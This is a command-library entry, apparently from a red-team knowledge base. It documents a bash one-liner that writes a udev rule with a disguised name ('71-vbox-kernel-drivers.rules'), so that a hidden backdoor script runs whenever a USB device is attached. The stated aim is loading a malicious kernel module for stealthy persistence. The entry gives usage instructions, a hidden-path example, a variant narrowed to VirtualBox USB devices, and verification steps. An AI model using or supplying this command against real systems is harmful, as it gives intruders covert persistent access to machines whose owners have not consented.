---
type: command
executor: bash
data: >-
  echo "ACTION==\"add\", ENV{DEVTYPE}==\"usb_device\", SUBSYSTEM==\"usb\",
  RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules >
  /dev/null
output: null
created_at: '2023-04-06T03:56:18.093000+00:00'
updated_at: '2023-04-10T20:34:18.258394+00:00'
platforms:
  - Linux
tags:
  - udev
  - persistence
  - backdoor
verified: true
validated: true
---

# create-backdoor-udev-rule-for-vbox

## Command

```bash
echo "ACTION==\"add\", ENV{DEVTYPE}==\"usb_device\", SUBSYSTEM==\"usb\", RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
```

## Description

This command creates a custom udev rules file that triggers a script ($RSHELL) to run when a USB device is added to the system. In the context of VirtualBox backdooring, $RSHELL should load a malicious kernel module, providing persistence tied to USB events common in VirtualBox usage. Use this after preparing the backdoor script to establish stealthy access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $RSHELL | Path to the script or command that loads the malicious kernel module (e.g., /tmp/.hidden/load_backdoor.sh) | Yes |
| /etc/udev/rules.d/71-vbox-kernel-drivers.rules | Target file path for the new udev rule (custom name to avoid overwriting defaults) | Yes (built-in) |

## Examples

### Basic Usage

```bash
echo "ACTION==\"add\", ENV{DEVTYPE}==\"usb_device\", SUBSYSTEM==\"usb\", RUN+=\"/tmp/.hidden/load_backdoor.sh\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
```

### Advanced Usage

To make it more specific to VirtualBox USB vendors, extend the rule with ATTRS{idVendor}=="80ee" (VirtualBox USB ID), but this basic version triggers on any USB add.

```bash
echo "ACTION==\"add\", ENV{DEVTYPE}==\"usb_device\", SUBSYSTEM==\"usb\", ATTRS{idVendor}==\"80ee\", RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
```

## Expected Output

No visible output on the console due to `> /dev/null`. Verify success by checking the file contents:

```bash
cat /etc/udev/rules.d/71-vbox-kernel-drivers.rules
```

Expected: ACTION=="add", ENV{DEVTYPE}=="usb_device", SUBSYSTEM=="usb", RUN+="$RSHELL"

## Related

- [[procedures/Backdoor-VirtualBox-Driver-via-Udev-Rules]] (procedure that uses this command)
- [[Kernel Modules and Extensions]] (MITRE technique)
